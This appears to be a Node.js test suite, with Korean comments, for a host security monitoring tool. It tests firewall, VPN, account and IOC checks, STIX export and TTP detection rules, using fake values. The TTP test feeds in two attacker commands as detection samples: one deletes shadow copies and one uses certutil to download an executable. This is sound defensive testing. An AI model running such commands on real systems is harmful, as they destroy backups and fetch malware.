// 호스트 점검 판정 규칙, 영역 분류, IOC 저장소, STIX 왕복, 메인 화면 링크 덧붙이기 시험. 모두 가짜 값이며 이 PC를 읽지 않는다.
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { domainOf } from '../src/soc/domains.mjs';
import { fwRuleFindings, ipsFindings, vpnFindings, vpnState, nacFindings, iamFindings, iamBaseline } from '../src/soc/host-checks.mjs';
import { createIocStore, normalizeIndicator } from '../src/soc/ti/ioc-store.mjs';
import { exportBundle, parseAuto } from '../src/soc/ti/stix.mjs';
import { evaluateTtp } from '../src/soc/ti/ttp-rules.mjs';
import { attachPcStatus } from '../src/pc-status/routes.mjs';

const measured = (extra) => ({ status: 'measured', ...extra });

test('영역 분류: 규칙 접두어로 네트워크·계정·엔드포인트를 나눈다', () => {
  assert.equal(domainOf({ rule: { id: 'NET-VPN-DOWN' } }), 'network');
  assert.equal(domainOf({ rule: { id: 'FW-OFF' } }), 'network');
  assert.equal(domainOf({ rule: { id: 'PORT-NEW-EXPOSED' } }), 'network');
  assert.equal(domainOf({ rule: { id: 'IAM-NEW-ACCOUNT' } }), 'iam');
  assert.equal(domainOf({ rule: { id: 'AGENT-SENSITIVE' } }), 'iam');
  assert.equal(domainOf({ rule: { id: 'DEF-RT-OFF' } }), 'endpoint');
  assert.equal(domainOf({ rule: { id: 'IOC-MATCH' }, evidence: { ioc: { type: 'ipv4' } } }), 'network');
  assert.equal(domainOf({ rule: { id: 'IOC-MATCH' }, evidence: { ioc: { type: 'sha256' } } }), 'endpoint');
  assert.equal(domainOf({ source: 'test', rule: { id: 'TEST-ALERT' } }), 'test');
});

test('방화벽 규칙: 기준선이 없으면 비교하지 않고, 기준선 뒤 새 규칙만 높음으로 올린다', () => {
  const cell = measured({ names: ['a', 'b', 'new-one'], count: 3 });
  assert.deepEqual(fwRuleFindings(null, cell), []);
  const found = fwRuleFindings(['a', 'b'], cell);
  assert.equal(found.length, 1);
  assert.equal(found[0].ruleId, 'NET-FWRULE-NEW');
  assert.equal(found[0].severity, 'high');
  assert.deepEqual(fwRuleFindings(['a', 'b'], { status: 'unavailable' }), []);
});

test('IPS 대용: 네트워크 검사 꺼짐은 주의, 새 탐지는 높음, 조치 실패는 긴급', () => {
  const off = ipsFindings(null, measured({ nis: false, netProtection: 'off', detections: [] }));
  assert.equal(off[0].ruleId, 'NET-IPS-NIS-OFF');
  const known = new Set([1]);
  const fresh = ipsFindings(known, measured({ nis: true, netProtection: 'on', detections: [{ id: 1, success: true }, { id: 2, success: true }, { id: 3, success: false }] }));
  assert.deepEqual(fresh.map((x) => [x.ruleId, x.severity]), [['NET-IPS-DETECTION', 'high'], ['NET-IPS-DETECTION', 'critical']]);
});

test('VPN: 연결돼 있던 것이 끊어질 때만 알리고, 원래 꺼져 있던 것은 알리지 않는다', () => {
  const before = vpnState(measured({ profiles: [{ name: 'corp', connected: true }], adapters: [{ name: 'tun0', up: false }] }));
  const after = measured({ profiles: [{ name: 'corp', connected: false }], adapters: [{ name: 'tun0', up: false }] });
  const found = vpnFindings(before, after);
  assert.equal(found.length, 1);
  assert.equal(found[0].ruleId, 'NET-VPN-DOWN');
  assert.deepEqual(vpnFindings(null, after), []);
});

test('NAC 대용: 시작 뒤 처음 보이는 장치만 낮음 사건이고 MAC 전체는 싣지 않는다', () => {
  const found = nacFindings(['aa-aa-aa-aa-aa-01'], measured({ neighborMacs: ['aa-aa-aa-aa-aa-01', 'bb-bb-bb-bb-bb-02'] }));
  assert.equal(found.length, 1);
  assert.equal(found[0].severity, 'low');
  assert.ok(!JSON.stringify(found).includes('bb-bb-bb-bb-bb-02'));
});

test('계정: 상태 규칙은 기준선 없이도, 비교 규칙은 기준선이 있을 때만 판정한다', () => {
  const cell = measured({
    users: [{ name: 'user', enabled: true, pwRequired: false }, { name: 'Guest', enabled: false, pwRequired: false }, { name: 'newbie', enabled: true, pwRequired: true }],
    admins: ['user', 'sneaky'], autoLogon: true, uac: false, elevated: false,
  });
  const noBase = iamFindings(null, cell).map((x) => x.ruleId).sort();
  assert.deepEqual(noBase, ['IAM-AUTOLOGON', 'IAM-NO-PWREQ', 'IAM-UAC-OFF']);
  const base = iamBaseline(measured({ users: [{ name: 'user' }, { name: 'Guest' }], admins: ['user'] }));
  const withBase = iamFindings(base, cell);
  const admin = withBase.find((x) => x.ruleId === 'IAM-ADMIN-ADDED');
  assert.ok(admin && admin.severity === 'critical');
  assert.ok(withBase.some((x) => x.ruleId === 'IAM-NEW-ACCOUNT'));
  // 비밀번호 값은 어디에도 없다
  assert.ok(!JSON.stringify(withBase).toLowerCase().includes('defaultpassword'));
});

test('IOC 저장소: 형식 검증, 넓은 CIDR 거부, 대조, 중복, 공유 가능 여부', () => {
  assert.ok(normalizeIndicator('ipv4', '300.1.1.1').error);
  assert.ok(normalizeIndicator('cidr4', '10.0.0.0/7').error);
  assert.equal(normalizeIndicator('cidr4', '203.0.113.0/24').value, '203.0.113.0/24');
  assert.ok(normalizeIndicator('sha256', 'abc').error);
  const store = createIocStore();
  assert.ok(store.add({ type: 'ipv4', value: '203.0.113.7', severity: 'high' }).ioc);
  assert.ok(store.add({ type: 'ipv4', value: '203.0.113.7' }).duplicate);
  store.add({ type: 'cidr4', value: '198.51.100.0/24' });
  store.add({ type: 'domain', value: '*.evil.example' });
  store.add({ type: 'process', value: 'badtool.exe' });
  assert.equal(store.match({ type: 'ip', value: '203.0.113.7' }).length, 1);
  assert.equal(store.match({ type: 'ip', value: '198.51.100.99' }).length, 1);
  assert.equal(store.match({ type: 'ip', value: '198.51.101.1' }).length, 0);
  assert.equal(store.match({ type: 'domain', value: 'a.evil.example' }).length, 1);
  assert.equal(store.match({ type: 'process', value: 'badtool.exe' }).length, 1);
  const types = store.exportable().map((x) => x.type).sort();
  assert.deepEqual(types, ['cidr4', 'domain', 'ipv4']);
});

test('IOC 저장소: 파일로 저장하고 다시 읽으며 오탐 허용 목록도 남는다', () => {
  const files = new Map();
  const fsApi = { existsSync: (p) => files.has(p), readFileSync: (p) => files.get(p), writeFileSync: (p, text) => { files.set(p, text); }, renameSync: (from, to) => { files.set(to, files.get(from)); files.delete(from); }, mkdirSync: () => {} };
  const a = createIocStore({ file: '/x/ioc.json', fsApi });
  a.add({ type: 'ipv4', value: '203.0.113.9' });
  a.allowKey('ioc:203.0.113.5', '내 서버');
  const b = createIocStore({ file: '/x/ioc.json', fsApi });
  b.load();
  assert.equal(b.list().length, 1);
  assert.ok(b.isAllowed('ioc:203.0.113.5'));
});

test('STIX: 내보낸 번들을 다시 가져오면 같은 지표가 되고, 공유하지 않는 유형은 빠진다', () => {
  const store = createIocStore();
  store.add({ type: 'ipv4', value: '203.0.113.7', severity: 'high', tlp: 'amber', description: '시험' });
  store.add({ type: 'domain', value: 'evil.example' });
  store.add({ type: 'process', value: 'badtool.exe' });
  const { bundle, exported } = exportBundle(store.exportable());
  assert.equal(bundle.type, 'bundle');
  assert.equal(exported, 2);
  const text = JSON.stringify(bundle);
  assert.ok(!text.includes('badtool'));
  const parsed = parseAuto(text);
  assert.equal(parsed.format, 'stix');
  assert.deepEqual(parsed.items.map((x) => [x.type, x.value]).sort(), [['domain', 'evil.example'], ['ipv4', '203.0.113.7']]);
  assert.ok(parseAuto('이건 JSON이 아님 {').format === 'text');
  assert.ok(parseAuto('{"type":"bundle"').error || parseAuto('{"type":"bundle"').items?.length === 0);
});

test('TTP 규칙: 알려진 패턴만 걸리고 일반 명령은 걸리지 않는다', () => {
  assert.equal(evaluateTtp('vssadmin delete shadows /all /quiet')[0].rule.id, 'TTP-SHADOW-DELETE');
  assert.equal(evaluateTtp('certutil -urlcache -split -f http://203.0.113.5/a.exe a.exe')[0].rule.id, 'TTP-CERTUTIL-DOWNLOAD');
  assert.equal(evaluateTtp('node --test').length, 0);
});

test('메인 화면에 보안 관제 링크를 덧붙이되 원본 응답 외의 것은 건드리지 않는다', async () => {
  const original = '<!doctype html><html><body><h1>보안 앱</h1></body></html>';
  const server = http.createServer((req, res) => { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'content-length': Buffer.byteLength(original) }); res.end(original); });
  attachPcStatus(server, { sampler: { sample: () => ({}) }, history: { add() {}, list: () => [] } });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;
  const get = (path) => new Promise((resolve, reject) => http.get({ host: '127.0.0.1', port, path }, (res) => { let text = ''; res.setEncoding('utf8'); res.on('data', (c) => { text += c; }); res.on('end', () => resolve({ status: res.statusCode, text, headers: res.headers })); }).on('error', reject));
  try {
    const main = await get('/');
    assert.equal(main.status, 200);
    assert.ok(main.text.includes('<h1>보안 앱</h1>') && main.text.includes('href="/pc-status"') && main.text.includes('/pc-status/link.css'));
    assert.equal(Number(main.headers['content-length'] ?? Buffer.byteLength(main.text)), Buffer.byteLength(main.text));
    const css = await get('/pc-status/link.css');
    assert.equal(css.status, 200);
    assert.ok(css.headers['content-type'].startsWith('text/css'));
    const other = await get('/something-else');
    assert.equal(other.text, original);
  } finally { await new Promise((resolve) => server.close(resolve)); }
});

test('폴더 감시: hosts·시작 프로그램은 내용 지문이 실제로 바뀔 때만 알린다(읽기만 한 알림은 무시)', async () => {
  const { createFileWatcher } = await import('../src/soc/file-watch.mjs');
  const added = [];
  const store = { add: (e) => { added.push(e); return { event: e }; } };
  let print = 'A';
  const watcher = createFileWatcher({ targets: [{ dir: 'C:\etc', sensitive: false, kind: 'hosts' }], store, watch: () => ({ on() {}, close() {} }), fingerprint: () => print, now: (() => { let t = 0; return () => (t += 5000); })() });
  watcher.start();
  watcher.onChange({ dir: 'C:\etc', sensitive: false, kind: 'hosts' }, 'change', 'hosts');
  assert.equal(added.length, 0);
  print = 'B';
  watcher.onChange({ dir: 'C:\etc', sensitive: false, kind: 'hosts' }, 'change', 'hosts');
  assert.equal(added.length, 1);
  assert.equal(added[0].rule.id, 'FILE-HOSTS-CHANGE');
});
